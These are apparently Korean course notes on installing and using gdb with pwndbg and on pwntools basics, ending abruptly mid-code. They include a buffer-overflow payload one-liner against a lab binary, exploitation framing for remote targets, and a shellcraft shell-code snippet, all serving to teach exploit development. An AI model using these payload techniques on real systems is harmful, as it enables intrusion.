# STAGE 3 Tool Installation

# Tool: gdb

## 1. 서론

### 디버거

- 프로그램의 결함을 **버그(bug)** 라고 함
- 이미 완성된 코드에서 버그를 찾는 것은 어려움
    - 어려움을 해소하고자 **디버거(Debugger)** 라는 도구가 개발됨
- 디버거는 문자 그대로 버그를 없애기 위해 사용하는 도구
    - 프로그램을 어셈블리 코드 단위로 실행하면서, 실행 결과를 사용자에게 보여줌
    - 추상적으로 생각한 아이디어의 결과를 직관적으로 보여주기 때문에, 개발자는 디버거를 사용하여 자신이 작성한 코드의 문제점을 더욱 명확하게 찾을 수 있음

## 2. gdb & pwndbg

### gdb

```bash
$ git clone https://github.com/pwndbg/pwndbg
$ cd pwndbg
$ ./setup.sh

$ gdb
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
pwndbg: loaded 147 pwndbg commands and 45 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
Pwndbg mirrors some of Windbg commands like eq, ew, ed, eb, es, dq, dw, dd, db, ds for writing and reading memory
pwndbg>
```

- **gdb (GNU debugger)** 는 리눅스의 대표적인 디버거
- gdb의 플러그인 중에서 바이너리 분석 용도로 널리 사용되는 플러그인
    - 해당 챕터에서는 *pwngdb*만 사용
    - gef : [https://github.com/hugsy/gef](https://github.com/hugsy/gef)
    - peda : [https://github.com/longld/peda](https://github.com/longld/peda)
    - pwngdb : [https://github.com/scwuaptx/Pwngdb](https://github.com/scwuaptx/Pwngdb)
    - pwndbg : [https://github.com/pwndbg/pwndbg](https://github.com/pwndbg/pwndbg)
- gdb의 명령어 축약
    - b : break
    - c : continue
    - r : run
    - si : step into
    - ni : next instruction
    - i : info
    - k : kill
    - pd : pdisas

### example : debugee.c

```c
/*
 * Name: S2_00_debugee.c
 * $ gcc -o S2_00_debugee S2_00_debugee.c -no-pie
 */

#include <stdio.h>

int main(void)
{
    int sum = 0;
    int val1 = 1;
    int val2 = 2;
    sum = val1 + val2;
    printf("1 + 2 = %d\n", sum);
    return 0;
}
```

```bash
$ readelf -h S2_00_debugee

ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x401050
  Start of program headers:          64 (bytes into file)
  Start of section headers:          14656 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         13
  Size of section headers:           64 (bytes)
  Number of section headers:         31
  Section header string table index: 30
```

- 리눅스는 실행 파일의 형식으로 **ELF (Executable and Linkable Format)** 를 규정
    - ELF는 크게 헤더와 여러 섹션들로 구성
        - 헤더에는 실행에 필요한 여러 정보가 적혀 있음
        - 섹션들에는 컴파일된 기계어 코드, 프로그램 문자열을 비롯한 여러 데이터가 포함
- ELF의 헤더 중에 **진입점(Entry Point, EP)** 이라는 필드가 있는데, 운영체제는 ELF를 실행할 때, 진입점의 값부터 프로그램을 실행
    - `readelf` 로 확인해본 결과, debugee의 진입점은 `0x401050`

### entry

```nasm
$ gdb S2_00_debugee

...
pwndbg> entry
Temporary breakpoint 1 at 0x401050

Temporary breakpoint 1, 0x0000000000401050 in _start ()
...
[ DISASM / x86-64 / set emulate on ]
 ► 0x401050 <_start>       endbr64 
   0x401054 <_start+4>     xor    ebp, ebp
   0x401056 <_start+6>     mov    r9, rdx
   0x401059 <_start+9>     pop    rsi
   0x40105a <_start+10>    mov    rdx, rsp
   0x40105d <_start+13>    and    rsp, 0xfffffffffffffff0
   0x401061 <_start+17>    push   rax
   0x401062 <_start+18>    push   rsp
   0x401063 <_start+19>    mov    r8, __libc_csu_fini           <0x4011f0>
   0x40106a <_start+26>    mov    rcx, __libc_csu_init          <0x401180>
   0x401071 <_start+33>    mov    rdi, main                     <0x401136>
[ STACK ]
...
[ BACKTRACE ]
 ► 0         0x401050 _start
... 
pwndbg>
```

- gdb의 **entry** 명령어는 진입점부터 프로그램을 분석할 수 있게 해주는 gdb의 명령어
    - DISASM영역의 화살표(►)가 가리키는 주소는 현재 rip의 값
    - entry 명령어를 실행하고 보면 0x401050을 가리키고 있음
    - `readelf`  프로그램 진입점의 주소와 일치
- `start` 는 진입점부터 프로그램을 분석할 수 있도록 자동으로 중단점을 설정

### context

- 프로그램은 실행되면서 레지스터를 비롯한 여러 메모리에 접근
    - pwndbg는 주요 메모리들의 상태를 프로그램이 실행되고 있는 **맥락(Context)** 이라고 부르며, 이를 가독성 있게 표현할 수 있는 인터페이스를 갖추고 있음
- context는 크게 4개의 영역으로 구분
    - REGISTERS : 레지스터의 상태를 보여줌
    - DISASM : rip부터 여러 줄에 걸쳐 디스어셈블된 결과를 보여줌
    - STACK : rsp부터 여러 줄에 걸쳐 스택의 값들을 보여줌
    - BACKTRACE : 현재 rip에 도달할 때까지 어떤 함수들이 중첩되어 호출됐는지 보여줌
- 어셈블리를 실행할 때마다 갱신되어 방금 실행한 어셈블리 명령어가 메모리에 어떤 영향을 줬는지 파악 가능

### break & continue

```nasm
pwndbg> b *main
Breakpoint 2 at 0x401136

pwndbg> c
Continuing.

Breakpoint 2, 0x0000000000401136 in main ()
...
[ DISASM / x86-64 / set emulate on ]
 ► 0x401136 <main>       endbr64 
   0x40113a <main+4>     push   rbp
   0x40113b <main+5>     mov    rbp, rsp
   0x40113e <main+8>     sub    rsp, 0x10
   0x401142 <main+12>    mov    dword ptr [rbp - 0xc], 0
   0x401149 <main+19>    mov    dword ptr [rbp - 8], 1
   0x401150 <main+26>    mov    dword ptr [rbp - 4], 2
   0x401157 <main+33>    mov    edx, dword ptr [rbp - 8]
   0x40115a <main+36>    mov    eax, dword ptr [rbp - 4]
   0x40115d <main+39>    add    eax, edx
   0x40115f <main+41>    mov    dword ptr [rbp - 0xc], eax
[ STACK ]
...
[ BACKTRACE ]
...
pwndbg>
```

- gdb를 이용하여 프로그램을 분석할 때, 일반적으로 전체 프로그램 중 일부분의 동작에만 관심이 있음
    - `S2_00_debugee` 에서는 `main` 함수가 분석의 대상이라고 가정
    - 진입점부터 `main` 함수까지, 코드를 한 줄씩 실행시켜가며 `main` 함수에 도달해야 한다면, 디버깅은 그렇게 효율적인 분석 방법이 아닐 것임
- 많은 디버거에는 **break**와 **continue**라는 기능이 존재
    - **break**는 특정 주소에 **중단점(breakpoint)** 을 설정하는 기능
    - **continue**는 중단된 프로그램을 계속 실행시키는 기능
    - break로 원하는 함수에 중단점을 설정하고, 프로그램을 계속 실행하면 해당 함수까지 멈추지 않고 실행한 다음 중단, 중단된 지점부터 다시 세밀하게 분석

### run

- **run**은 단순히 실행만 시킴
    - 중단점을 설정하지 않았다면 프로그램이 끝까지 멈추지 않고 실행
    - 현재 `main` 함수에 중단점을 설정해놨기 때문에 run명령어를 실행해도, `main` 함수에서 실행이 멈춤

### disassembly

```nasm
pwndbg> disassemble main
Dump of assembler code for function main:
=> 0x0000000000401136 <+0>:     endbr64 
   0x000000000040113a <+4>:     push   rbp
   0x000000000040113b <+5>:     mov    rbp,rsp
   0x000000000040113e <+8>:     sub    rsp,0x10
   0x0000000000401142 <+12>:    mov    DWORD PTR [rbp-0xc],0x0
   0x0000000000401149 <+19>:    mov    DWORD PTR [rbp-0x8],0x1
   0x0000000000401150 <+26>:    mov    DWORD PTR [rbp-0x4],0x2
   0x0000000000401157 <+33>:    mov    edx,DWORD PTR [rbp-0x8]
   0x000000000040115a <+36>:    mov    eax,DWORD PTR [rbp-0x4]
   0x000000000040115d <+39>:    add    eax,edx
   0x000000000040115f <+41>:    mov    DWORD PTR [rbp-0xc],eax
   0x0000000000401162 <+44>:    mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000401165 <+47>:    mov    esi,eax
   0x0000000000401167 <+49>:    lea    rdi,[rip+0xe96]        # 0x402004
   0x000000000040116e <+56>:    mov    eax,0x0
   0x0000000000401173 <+61>:    call   0x401040 <printf@plt>
   0x0000000000401178 <+66>:    mov    eax,0x0
   0x000000000040117d <+71>:    leave  
   0x000000000040117e <+72>:    ret    
End of assembler dump.
pwndbg>
```

- gdb는 프로그램을 어셈블리 코드 단위로 실행하고, 결과를 보여줌
    - 프로그램의 코드는 기계어로 이루어져 있으므로, gdb는 기계어를 **디스어셈블(Disassemble)** 하는 기능을 기본적으로 탑재
- **disassemble**은 gdb가 기본적으로 제공하는 디스어셈블 명령어
    - 코드와 같이 함수 이름을 인자로 전달하면 해당 함수가 반환될 때 까지 전부 디스어셈블하여 보여줌
- **u, nearpc, pdisass**는 pwndbg에서 제공하는 디스어셈블 명령어
    - 디스어셈블된 코드를 가독성 좋게 출력

### navigate

```nasm
pwndbg> b *main+61
Breakpoint 3 at 0x401173
pwndbg> continue
Continuing.

Breakpoint 3, 0x0000000000401173 in main ()
...
[ DISASM / x86-64 / set emulate on ]
 ► 0x401173 <main+61>               call   printf@plt                      <printf@plt>
        format: 0x402004 ◂— '1 + 2 = %d\n'
        vararg: 0x3
 
   0x401178 <main+66>               mov    eax, 0
   0x40117d <main+71>               leave  
   0x40117e <main+72>               ret    
 
   0x40117f                         nop    
   0x401180 <__libc_csu_init>       endbr64 
   0x401184 <__libc_csu_init+4>     push   r15
   0x401186 <__libc_csu_init+6>     lea    r15, [rip + 0x2c83]           <__init_array_start>
   0x40118d <__libc_csu_init+13>    push   r14
   0x40118f <__libc_csu_init+15>    mov    r14, rdx
   0x401192 <__libc_csu_init+18>    push   r13
...
pwndbg>
```

- 관찰하고자 하는 함수의 중단점에 도달했으면, 그 지점부터는 명령어를 한 줄씩 자세히 분석
    - 이때 사용하는 명령어로 **ni**와 **si**가 있음
- ni와 si는 모두 어셈블리 명령어를 한 줄 실행한다는 공통점이 있음
    - call 등을 통해 서브루틴을 호출하는 경우
        - ni는 서브루틴의 내부로 진입하지 않음
        - si는 서브루틴의 내부로 진입
- `main` 함수에서 `printf` 함수를 호출하는 지점까지 실행 후 비교
    - disassemble 결과, 0x0000000000401173 <+61>: call 0x401040 [printf@plt](mailto:printf@plt)

```nasm
pwndbg> ni
1 + 2 = 3
0x0000000000401178 in main ()
...
[ DISASM / x86-64 / set emulate on ]
   0x401173       <main+61>                  call   printf@plt                      <printf@plt>
 
 ► 0x401178       <main+66>                  mov    eax, 0
   0x40117d       <main+71>                  leave  
   0x40117e       <main+72>                  ret    
    ↓
   0x7ffff7de6083 <__libc_start_main+243>    mov    edi, eax
   0x7ffff7de6085 <__libc_start_main+245>    call   exit                <exit>
 
   0x7ffff7de608a <__libc_start_main+250>    mov    rax, qword ptr [rsp + 8]
   0x7ffff7de608f <__libc_start_main+255>    lea    rdi, [rip + 0x18fdd2]
   0x7ffff7de6096 <__libc_start_main+262>    mov    rsi, qword ptr [rax]
   0x7ffff7de6099 <__libc_start_main+265>    xor    eax, eax
   0x7ffff7de609b <__libc_start_main+267>    call   qword ptr [rdx + 0x1d0]
...
pwndbg>
```

- next instruction
    - ni를 입력하면, 코드와 같이 `printf` 함수 바로 다음으로 rip가 이동

```nasm
pwndbg> si
0x0000000000401040 in printf@plt ()
...
[ DISASM / x86-64 / set emulate on ]
 ► 0x401040       <printf@plt>                     endbr64 
   0x401044       <printf@plt+4>                   bnd jmp qword ptr [rip + 0x2fcd]     <0x401030>
    ↓
   0x401030                                        endbr64 
   0x401034                                        push   0
   0x401039                                        bnd jmp 0x401020                     <0x401020>
    ↓
   0x401020                                        push   qword ptr [rip + 0x2fe2]      <_GLOBAL_OFFSET_TABLE_+8>
   0x401026                                        bnd jmp qword ptr [rip + 0x2fe3]     <_dl_runtime_resolve_xsave>
    ↓
   0x7ffff7fe7af0 <_dl_runtime_resolve_xsave>      endbr64 
   0x7ffff7fe7af4 <_dl_runtime_resolve_xsave+4>    push   rbx
   0x7ffff7fe7af5 <_dl_runtime_resolve_xsave+5>    mov    rbx, rsp
   0x7ffff7fe7af8 <_dl_runtime_resolve_xsave+8>    and    rsp, 0xffffffffffffffc0
...
[ BACKTRACE ]
 ► 0         0x401040 printf@plt
   1         0x401178 main+66
   2   0x7ffff7de6083 __libc_start_main+243
...
pwndbg> finish
Run till exit from #0  0x0000000000401040 in printf@plt ()
1 + 2 = 3
0x0000000000401178 in main ()
...
[ DISASM / x86-64 / set emulate on ]
   0x401173       <main+61>                  call   printf@plt                      <printf@plt>
 
 ► 0x401178       <main+66>                  mov    eax, 0
   0x40117d       <main+71>                  leave  
   0x40117e       <main+72>                  ret    
    ↓
   0x7ffff7de6083 <__libc_start_main+243>    mov    edi, eax
   0x7ffff7de6085 <__libc_start_main+245>    call   exit                <exit>
 
   0x7ffff7de608a <__libc_start_main+250>    mov    rax, qword ptr [rsp + 8]
   0x7ffff7de608f <__libc_start_main+255>    lea    rdi, [rip + 0x18fdd2]
   0x7ffff7de6096 <__libc_start_main+262>    mov    rsi, qword ptr [rax]
   0x7ffff7de6099 <__libc_start_main+265>    xor    eax, eax
   0x7ffff7de609b <__libc_start_main+267>    call   qword ptr [rdx + 0x1d0]
...
[ BACKTRACE ]
 ► 0         0x401178 main+66
   1   0x7ffff7de6083 __libc_start_main+243
...
pwndbg>
```

- step into
    - `printf` 함수를 호출하는 지점까지 다시 프로그램을 실행
    - si를 입력하면 코드와 같이 `printf` 함수 내부로 rip가 이동
    - context하단의 Backtrace를 보면, `main` 함수에서 `printf` 를 호출했으므로 `main` 함수 위에 `printf` 함수가 쌓임
- finish
    - step into로 함수 내부에 들어가서 필요한 부분을 모두 분석했는데, 함수의 규모가 커서 ni로는 원래 실행 흐름으로 돌아가기 어려울 수 있음
    - **finish** 명령어를 사용하여 함수의 끝까지 한 번에 실행할 수 있음

- 프로그램을 분석하다가, 어떤 함수의 내부까지 궁금할 때는 si를, 그렇지 않을 때는 ni를 사용
- `printf` 를 실행했는데 아무 문자열도 출력 되지 않는 이유
    - printf가 출력하고자 하는 문자열은 *stdout*의 버퍼에서 잠시 대기한 뒤 출력
    - 버퍼는 '데이터가 목적지로 이동하기 전에 잠시 저장되는 장소'
    - *stdout*버퍼는 특정 조건이 만족됐을 때만 데이터를 목적지로 이동시킴
        - 조건
            1. 프로그램이 종료될 때
            2. 버퍼가 가득 찼을 때
            3. fflush와 같은 함수로 버퍼를 비우도록 명시했을 때
            4. 개행문자가 버퍼에 들어왔을 때

### examine

> Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string) and z(hex, zero padded on the left). Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).
> 
- 프로그램을 분석하다 보면 가상 메모리에 존재하는 임의 주소의 값을 관찰해야할 때가 있음
    - gdb에서는 기본적으로 **x**라는 명령어를 제공
    - x를 이용하면 특정 주소에서 원하는 길이만큼의 데이터를 원하는 형식으로 인코딩하여 볼 수 있음
1. rsp부터 80바이트를 8바이트씩 hex형식으로 출력
    
    ```nasm
    pwndbg> x/10gx $rsp
    0x7fffffffdee0: 0x00000003ffffdfe0      0x0000000200000001
    0x7fffffffdef0: 0x0000000000000000      0x00007ffff7de6083
    0x7fffffffdf00: 0x00007ffff7ffc620      0x00007fffffffdfe8
    0x7fffffffdf10: 0x0000000100000000      0x0000000000401136
    0x7fffffffdf20: 0x0000000000401180      0xe3370f79e042a83f
    ```
    
2. rip부터 5줄의 어셈블리 명령어 출력
    
    ```nasm
    pwndbg> x/5i $rip
    => 0x401178 <main+66>:  mov    eax,0x0
       0x40117d <main+71>:  leave  
       0x40117e <main+72>:  ret    
       0x40117f:    nop
       0x401180 <__libc_csu_init>:  endbr64
    ```
    
3. 특정 주소의 문자열 출력
    
    ```nasm
    pwndbg> x/s 0x400000
    0x400000:       "\177ELF\002\001\001"
    ```
    

### telescope

```nasm
pwndbg> tele
00:0000│ rsp 0x7fffffffdee0 ◂— 0x3ffffdfe0
01:0008│     0x7fffffffdee8 ◂— 0x200000001
02:0010│ rbp 0x7fffffffdef0 ◂— 0x0
03:0018│     0x7fffffffdef8 —▸ 0x7ffff7de6083 (__libc_start_main+243) ◂— mov edi, eax
04:0020│     0x7fffffffdf00 —▸ 0x7ffff7ffc620 (_rtld_global_ro) ◂— 0x50f6300000000
05:0028│     0x7fffffffdf08 —▸ 0x7fffffffdfe8 —▸ 0x7fffffffe2a6 ◂— '/home/...'
06:0030│     0x7fffffffdf10 ◂— 0x100000000
07:0038│     0x7fffffffdf18 —▸ 0x401136 (main) ◂— endbr64
```

- **telescope**은 pwndbg가 제공하는 강력한 메모리 덤프 기능
    - 특정 주소의 메모리 값들을 보여주는 것에서 그치지 않고, 메모리가 참조하고 있는 주소를 재귀적으로 탐색하여 값을 보여줌

### vmmap

```nasm
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /home/...
          0x401000           0x402000 r-xp     1000   1000 /home/...
          0x402000           0x403000 r--p     1000   2000 /home/...
          0x403000           0x404000 r--p     1000   2000 /home/...
          0x404000           0x405000 rw-p     1000   3000 /home/...
          0x405000           0x426000 rw-p    21000      0 [heap]
    0x7ffff7dc2000     0x7ffff7de4000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7de4000     0x7ffff7f5c000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7f5c000     0x7ffff7faa000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7faa000     0x7ffff7fae000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fae000     0x7ffff7fb0000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fb0000     0x7ffff7fb6000 rw-p     6000      0 [anon_7ffff7fb0]
    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]
    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]
    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```

- **vmmap**은 가상 메모리의 레이아웃을 보여줌
    - 어떤 파일이 매핑된 영역일 경우, 해당 파일의 경로까지 출력
- 파일 매핑
    - 어떤 파일을 메모리에 적재하는 것을 파일 매핑이라고 함
        - 위 메모리 레이아웃에서 경로들이 매핑된 파일들
    - 리눅스에서는 ELF를 실행할 때, 먼저 ELF의 코드와 여러 데이터를 가상 메모리에 매핑하고, 해당 ELF에 링크된 **공유 오브젝트(Shared Object, so)**를 추가로 메모리에 매핑
        - 공유 오브젝트는 윈도우의 DLL과 대응되는 개념으로, 자주 사용되는 함수들을 미리 컴파일해둔 것
        - C언어의 printf, scanf 등이 리눅스에서는 libc(library C)에 구현되어 있음
        - 공유 오브젝트에 이미 구현된 함수를 호출할 때는 매핑된 메모리에 존재하는 함수를 대신 호출

### gdb / python

```c
/*
 * Name: S2_01_debugee2.c
 * $ gcc -o S2_01_debugee2 S2_01_debugee2.c -no-pie
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
	char name[20];
	if (argc < 2) {
		printf("Give me the argv[2]!\n");
		exit(0);
	}
	memset(name, 0, sizeof(name));

	printf("argv[1] %s\n", argv[1]);

	read(0, name, sizeof(name)-1);
	printf("Name: %s\n", name);
	return 0;
}
```

- gdb를 사용하여 프로그램을 디버깅할 때, 키보드로 직접 타이핑하기 어려운 복잡한 값을 입력해야 할 때가 있음
    - 숫자도 아니고, 알파벳도 아니며, 특수 문자도 아닌 값을 입력하는 상황
    - 이러한 값은 이용자가 직접 입력할 수 없는 값이기 때문에 파이썬으로 입력 값을 생성하고, 이를 프로그램 입력으로 넘겨주는 방식을 사용
- 위 코드는 프로그램의 인자로 전달된 값과 사용자로부터 입력 받은 값을 출력하는 예제
- 컴파일 후, `$ gdb S2_01_debugee2` 로 디버깅을 시작합니다.

### gdb / python argv

```bash
pwndbg> r $(python3 -c "print('\xff' * 100)")
Starting program: /home/.../S2_01_debugee2 $(python3 -c "print('\xff' * 100)")
argv[1] ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
```

- run 명령어의 인자로 `$()` 와 함께 파이썬 코드를 입력하면 값을 전달할 수 있음
    - 파이썬에서 `print` 함수를 통해 출력한 값을 `run(r)` 명령어의 인자로 전달하는 명령

### gdb / python input

```bash
pwndbg> r $(python3 -c "print('\xff' * 100)") <<< $(python3 -c "print('dreamhack')")
Starting program: /home/.../S2_01_debugee2 $(python3 -c "print('\xff' * 100)") <<< $(python3 -c "print('dreamhack')")
argv[1] ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
Name: dreamhack

[Inferior 1 (process 1542598) exited normally]
```

- 이전과 같이 `$()` 와 함께 파이썬 코드를 입력하면 값을 입력할 수 있음
    - 입력 값으로 전달하기 위해서는 `<<<` 를 사용
        - argv[1]에 임의의 값을 전달하고 : `$(python3 -c "print('\xff' * 100)")`
        - 값을 입력 : `<<< $(python3 -c "print('dreamhack')")`

# Tool: pwntools

## 1. 서론

### pwntools의 등장 배경

```bash
$ (python -c "print 'A'*0x30 + 'B'*0x8 + '\xa7\x05\x40\x00\x00\x00\x00\x00'";cat)| ./rao
```

- 간단한 프로그램에 대해서는 파이썬으로 공격 페이로드를 생성하고, 파이프를 통해 이를 프로그램에 전달하는 방식으로 익스플로잇을 수행할 수 있음
- 그러나 익스플로잇이 조금만 복잡해져도 위와 같은 방식은 사용하기 어려워짐
    - 페이로드를 생성하기 위해 복잡한 연산을 해야 할 수도 있고, 프로세스와 반복적으로 데이터를 주고받아야 할 수도 있음
    - 펄, 파이썬, C언어등으로 익스플로잇 스크립트, 또는 바이너리를 제작하여 사용

```python
#!/usr/bin/env python2
import socket

# Remote host and port
RHOST = '127.0.0.1'
RPORT = 31337

# Make TCP connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Build payload
payload = ''
payload += 'Socket script'
payload += '\n'

# Send payload
s.send(payload)

# Print received data
data = s.recv(1024)
print 'Received: {0}'.format(data)
```

```python
#!/usr/bin/env python3
from pwn import *

# Make TCP connection
r = remote('127.0.0.1', 31337)

# Build payload
payload = b''
payload += b'Socket script'
payload += b'\n'

# Send payload
r.send(payload)

# Print received data
data = r.recv(1024)
print(f'Received: {data}')
```

- socket모듈을 사용한 초기 파이썬 익스플로잇 스크립트의 예
- 파이썬으로 여러 개의 익스플로잇 스크립트를 작성하다 보면, 자주 사용하게 되는 함수들
    - 정수를 리틀 엔디언의 바이트 배열로 바꾸는 패킹 함수, 또는 그 역을 수행하는 언패킹 함수 등은 익스플로잇 과정에 거의 항상 필요
    - 이런 함수들을 반복적으로 구현하는 것은 비효율적
        - 이들을 집대성하여 **pwntools**라는 파이썬 모듈을 제작
- [Shebang(#!)](https://bcp0109.tistory.com/343)

### pwntools 설치

```bash
$ python
Python 3.11.5 (main, Aug 31 2023, 09:33:39) [GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>>
```

- pwntools는 깃헙에 오픈 소스로 공개
    - [pwntools](https://github.com/Gallopsled/pwntools)
- pwntools를 임포트했을 때, 에러가 발생하지 않으면 제대로 설치된 것

## 2. pwntools API 사용법

- [pwntools의 공식 매뉴얼](https://docs.pwntools.com/en/latest/)
- 이하에서 test는 임의의 바이너리
    - process 객체를 대상으로 사용한 모든 함수는 remote 객체에서도 사용할 수 있음

### process & remote

```python
from pwn import *
p = process('./test')  # 로컬 바이너리 'test'를 대상으로 익스플로잇 수행
p = remote('example.com', 31337)  # 'example.com'의 31337 포트에서 실행 중인 프로세스를 대상으로 익스플로잇 수행
```

- `process` 함수는 익스플로잇을 로컬 바이너리를 대상으로 할 때 사용하는 함수
- `remote` 함수는 원격 서버를 대상으로 할 때 사용하는 함수
- 전자는 보통 익스플로잇을 테스트하고 디버깅하기 위해, 그리고 후자는 대상 서버를 실제로 공격하기 위해 사용

### send

```python
from pwn import *
p = process('./test')

p.send(b'A')  # ./test에 b'A'를 입력
p.sendline(b'A') # ./test에 b'A' + b'\n'을 입력
p.sendafter(b'hello', b'A')  # ./test가 b'hello'를 출력하면, b'A'를 입력
p.sendlineafter(b'hello', b'A')  # ./test가 b'hello'를 출력하면, b'A' + b'\n'을 입력
```

- `send` 는 데이터를 프로세스에 전송하기 위해 사용

### recv

```python
from pwn import *
p = process('./test')

data = p.recv(1024)  # p가 출력하는 데이터를 최대 1024바이트까지 받아서 data에 저장
data = p.recvline()  # p가 출력하는 데이터를 개행문자를 만날 때까지 받아서 data에 저장
data = p.recvn(5)  # p가 출력하는 데이터를 5바이트만 받아서 data에 저장
data = p.recvuntil(b'hello')  # p가 b'hello'를 출력할 때까지 데이터를 수신하여 data에 저장
data = p.recvall()  # p가 출력하는 데이터를 프로세스가 종료될 때까지 받아서 data에 저장
```

- `recv` 는 프로세스에서 데이터를 받기 위해 사용
- `recv()` 와 `recvn()` 의 차이점
    - `recv(n)` 은 최대 n 바이트를 받는 것이므로, 그 만큼을 받지 못해도 에러를 발생시키지 않음
    - `recvn(n)` 의 경우 정확히 n 바이트의 데이터를 받지 못하면 계속 기다림

### packing & unpacking

```python
#!/usr/bin/env python3
# Name: S3_00_pup.py

from pwn import *

s32 = 0x41424344
s64 = 0x4142434445464748

print(p32(s32))
print(p64(s64))

s32 = b"ABCD"
s64 = b"ABCDEFGH"

print(hex(u32(s32)))
print(hex(u64(s64)))
```

```bash
$ python3 S3_00_pup.py
b'DCBA'
b'HGFEDCBA'
0x44434241
0x4847464544434241
```

- 익스플로잇을 작성하다 보면 어떤 값을 리틀 엔디언의 바이트 배열로 변경하거나, 또는 역의 과정을 거쳐야 하는 경우가 자주 있음

### interactive

```bash
from pwn import *
p = process('./test')
p.interactive()
```

- 셸을 획득했거나, 익스플로잇의 특정 상황에 직접 입력을 주면서 출력을 확인하고 싶을 때 사용하는 함수
    - 호출하고 나면 터미널로 프로세스에 데이터를 입력하고, 프로세스의 출력을 확인할 수 있음

### ELF

```python
from pwn import *
e = ELF('./test')
puts_plt = e.plt['puts'] # ./test에서 puts()의 PLT주소를 찾아서 puts_plt에 저장
read_got = e.got['read'] # ./test에서 read()의 GOT주소를 찾아서 read_got에 저장
```

- ELF 헤더에는 익스플로잇에 사용될 수 있는 각종 정보가 기록됨
    - pwntools를 사용하면 이 정보들을 쉽게 참조할 수 있음

### context.log

```python
from pwn import *
context.log_level = 'error' # 에러만 출력
context.log_level = 'debug' # 대상 프로세스와 익스플로잇간에 오가는 모든 데이터를 화면에 출력
context.log_level = 'info'  # 비교적 중요한 정보들만 출력
```

- 익스플로잇에 버그가 발생하면 익스플로잇도 디버깅해야 함
    - pwntools에는 디버그의 편의를 돕는 로깅 기능이 있으며, 로그 레벨은 `context.log_level` 변수로 조절할 수 있음

### context.arch

```python
from pwn import *
context.arch = "amd64" # x86-64 아키텍처
context.arch = "i386"  # x86 아키텍처
context.arch = "arm"   # arm 아키텍처
```

- pwntools는 셸코드를 생성하거나, 코드를 어셈블, 디스어셈블하는 기능 등을 가지고 있는데, 이들은 공격 대상의 아키텍처에 영향을 받음
    - pwntools는 아키텍처 정보를 프로그래머가 지정할 수 있게 하며, 이 값에 따라 몇몇 함수들의 동작이 달라짐
- 아키텍처 확인 명령어
    - `$ dpkg -s libc6 | grep Arch`

### shellcraft

```python
#!/usr/bin/env python3
# Name: S3_01_shellcraft.py

from pwn import *
context.arch = 'amd64' # 대상 아키텍처 x86-64

code = shellcraft.sh() # 셸을 실행하는 셸 코드 
